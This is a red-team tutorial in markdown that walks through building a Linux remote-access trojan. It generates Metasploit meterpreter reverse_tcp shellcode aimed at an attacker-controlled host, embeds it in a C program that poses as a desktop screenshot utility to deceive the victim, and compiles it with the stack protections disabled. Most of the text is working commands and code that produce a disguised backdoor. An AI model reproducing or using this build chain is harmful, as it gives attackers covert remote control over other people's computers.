#### EXERCISE OBJECTIVES
Take control of a linux system remotely ( metasploit - RAT )

<br />

#### STEPS REQUIRED TO ACHIEVE THIS
[1º - Use Metasploit to Build Shellcode in C Format](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#use-metasploit-to-build-shellcode-in-c-format)<br />
[2º - Insert the C shellcode created into a C program](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#insert-the-c-shellcode-created-into-a-c-program)<br />
[3º - Use GCC to compile the C program (make it executable)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#use-gcc-to-compile-the-c-program-make-it-executable)<br />

<br />

#### SOCIAL ENGINEERING
'Take a desktop screenshot using a C program'.<br />
The C program not only runs the shellcode (RAM) that allows us to control the target PC remotely,<br />
but also contains a system command that takes a screenshot to the desktop of the target PC using<br />
[MITRE ATT&CK T1113 (xwd package)](https://attack.mitre.org/techniques/T1113/) Technic.<br />

<br /><br />

| DEPENDENCIE | FUNCTION | REQUIRED |
|---|---|---|
| Metasploit | Build shellcode ; recive connection ( handler )| yes |
| [GCC](https://www.cyberciti.biz/faq/debian-linux-install-gnu-gcc-compiler/) | Compile the C Program ( make it executable ) | yes |
| [xwd](http://blog.tordeu.com/?p=135) | Take Screenshots ( social engineering ) | optional |


<br /><br />

#### SHELLCODING DESCRIPTION

<br /><br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#exercise-objectives)

---

<br /><br /><br />

#### Use Metasploit to Build Shellcode in C Format

```
   ## build shellcode folder
   sudo mkdir shellcode
   cd shellcode


   ## Build raw shellcode in C
   # WARNING: Replace LHOST value by your ip address
   # WARNING: If your attacking a x86 bit system, then change the arch from x64 to x86
   #
   sudo msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.11 LPORT=666 -a x64 --platform linux -f c -o chars.raw

```

<br /><br />

#### Insert the C shellcode created into a C program

```
   ## Parse shellcode data and store it into a local bash variable
   pa=$(cat chars.raw | grep -v "=" | tr -d '";' | tr -d '\n' | tr -d ' ')

   ## Build payload.c
   echo "#include<stdio.h>" > payload.c
   echo "#include<stdlib.h>" >> payload.c
   echo "#include<string.h>" >> payload.c
   echo "" >> payload.c
   echo "unsigned char buf[] = \"$pa\";" >> payload.c
   echo "" >> payload.c
   echo "int main()" >> payload.c
   echo "{" >> payload.c
   echo "  printf(\"[i] Please Wait, Taking Screenshot ..\");" >> payload.c
   echo "  printf(\"[i] Screenshot Stored Under: /tmp/ScreenShot.xwd\");" >> payload.c
   echo "  system(\"xwd -root -out /tmp/ScreenShot.xwd\");" >> payload.c
   echo "  system(\"xuwd -in /tmp/ScreenShot.xwd\");" >> payload.c
   echo "  void (*ret)() = (void(*)())buf;" >> payload.c
   echo "  ret();" >> payload.c
   echo "}" >> payload.c
```


<br /><br />

#### Use GCC to compile the C program (make it executable)

```
 sudo gcc -fno-stack-protector -z execstack payload.c -o desktop_screenshot
```

<br /><br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#exercise-objectives)

---

### Suspiciou Shell Activity - RedTeam @2019


